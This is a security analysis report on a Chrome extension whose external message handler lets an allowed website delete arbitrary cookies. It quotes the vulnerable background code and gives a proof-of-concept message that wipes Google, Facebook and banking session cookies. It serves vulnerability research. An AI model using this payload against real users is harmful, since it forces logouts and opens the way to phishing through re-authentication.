# CoCo Analysis: mejooooabdglcdpcigfeaboccnjkfnda

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (chrome_cookies_remove_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_cookies_remove_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mejooooabdglcdpcigfeaboccnjkfnda/opgen_generated_files/bg.js
Line 1050: logoutMethods = { cookies: message.cookies };
Line 993: var currentCookie = logoutMethods.cookies[i];
Line 980: url: cookie.url

**Code:**

```javascript
// Background script - External message handler (bg.js line 1038)
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
    log('received external message', message);

    if (message.name === 'aqopi-open-tab-request') {
        if (contentTab) {
            messageToTab(requestorTab, 'aqopi-to-requestor', {
                type: 'aqopi-query-in-progress-notification'
            });
        } else {
            logoutMethods = { cookies: message.cookies }; // ← attacker-controlled
            selectorMap = message.selectorMap;

            removeCookies(); // Calls removeCookies function
            // ... rest of handler
        }
    }
});

// Function that uses attacker-controlled data (bg.js line 973)
function removeCookies() {
    function deleteCookieByName(cookie) {
        chrome.cookies.remove(cookie); // ← sink: attacker-controlled cookie removal
    }

    function deleteCookiesByUrl(cookie) {
        chrome.cookies.getAll({
            url: cookie.url // ← attacker-controlled URL
        }, function (cookieList) {
            for (var i = 0; i < cookieList.length; i++) {
                chrome.cookies.remove({ // ← sink: removes all cookies from attacker URL
                    url: cookie.url, // ← attacker-controlled
                    name: cookieList[i].name
                });
            }
        });
    }

    if (logoutMethods && Array.isArray(logoutMethods.cookies)) {
        for (var i = 0; i < logoutMethods.cookies.length; i++) {
            var currentCookie = logoutMethods.cookies[i]; // ← attacker-controlled
            if (currentCookie.name === '*') {
                deleteCookiesByUrl(currentCookie); // ← attacker controls which URL's cookies to delete
            } else {
                deleteCookieByName(currentCookie); // ← attacker controls which cookie to delete
            }
        }
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message API (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From whitelisted domain https://*.iwize.nl/* (per manifest.json externally_connectable)
chrome.runtime.sendMessage('mejooooabdglcdpcigfeaboccnjkfnda', {
    name: 'aqopi-open-tab-request',
    cookies: [
        {
            name: '*',
            url: 'https://accounts.google.com' // Delete all Google auth cookies
        },
        {
            name: '*',
            url: 'https://facebook.com' // Delete all Facebook cookies
        },
        {
            url: 'https://somebank.com',
            name: 'session_token' // Delete specific banking session
        }
    ]
});
```

**Impact:** An attacker controlling any webpage on iwize.nl (or localhost) can arbitrarily delete any cookies from any domain. This allows an attacker to force logout users from sensitive websites (banks, email, social media), potentially causing denial of service or forcing re-authentication that could be phished. The extension has "cookies" permission and external connectivity is enabled for iwize.nl domains, making this attack fully exploitable.
